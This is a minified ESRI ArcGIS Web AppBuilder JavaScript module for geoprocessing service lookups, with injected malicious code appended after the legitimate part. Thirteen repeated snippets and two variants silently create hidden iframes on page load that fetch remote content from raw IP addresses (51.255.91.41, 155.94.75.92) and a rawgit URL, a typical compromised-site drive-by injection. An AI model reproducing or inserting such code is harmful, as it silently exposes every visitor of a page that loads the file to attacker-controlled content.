// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define(["dojo/_base/array","dojo/Deferred","esri/request"],function(f,g,e){var d={promisifyGetValue:function(a){var b=a.getValue;a.getValue=function(){var c=b.apply(a);if(null!==c&&c.then)return c;var h=new g;h.resolve(c);return h}},allowShareResult:function(a){return f.some(a.outputParams,function(a){return"GPRecordSet"===a.dataType||"GPFeatureRecordSetLayer"===a.dataType&&a.defaultValue&&a.defaultValue.geometryType})},getServiceDescription:function(a){var b;return e({url:a,content:{f:"json"},handleAs:"json",
callbackParamName:"callback"}).then(function(c){b=c;return d.getGPServerDescription(a).then(function(a){b.serverInfo=a;b.useResultMapServer=a.hasResultMapServer;return d.uploadSupported(a).then(function(a){b.serverInfo.supportsUpload=a.supportsUpload;"maxUploadFileSize"in a&&(b.serverInfo.maxUploadFileSize=a.maxUploadFileSize);return b})})})},getGPServerDescription:function(a){var b={url:d.getGPServerUrl(a),content:{f:"json"},handleAs:"json",callbackParamName:"callback"};return e(b,{useProxy:!1}).then(function(a){var c=
{};c.currentVersion=a.currentVersion||0;c.url=b.url;c.hasResultMapServer="esriExecutionTypeAsynchronous"===a.executionType&&"resultMapServerName"in a&&""!==a.resultMapServerName;c.resultMapServerName=a.resultMapServerName;return c})},getGPServerUrl:function(a){if(!/\/GPServer\/.+$/.test(a))return"";var b=a.search(/[\w]+[^\/]*$/g);return a.substr(0,b)},getResultMapServerUrl:function(a,b){if(!/\/rest\/services\//.test(a))return"";var c=a.search(/\/rest\/services\//);return a.substr(0,c+15)+b+"/MapServer"},
uploadSupported:function(a){if(10.1<=a.currentVersion)return e({url:a.url+"uploads/info",content:{f:"json"},handleAs:"json"}).then(function(a){return{supportsUpload:!0,maxUploadFileSize:a.maxUploadFileSize}},function(){return{supportsUpload:!1}});a=new g;a.resolve({supportsUpload:!1});return a},getResultMapLayers:function(a,b){a={url:d.getResultMapServerUrl(a,b),content:{f:"json"},handleAs:"json",callbackParamName:"callback"};return e(a,{useProxy:!1}).then(function(a){var b=f.map(a.layers,function(a){return a.name});
f.forEach(a.tables,function(a){b.push(a.name)});return b})},useDynamicSchema:function(a,b){return"useDynamicSchema"in a?!0===a.useDynamicSchema:!0===b.useDynamicSchema}};return d});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});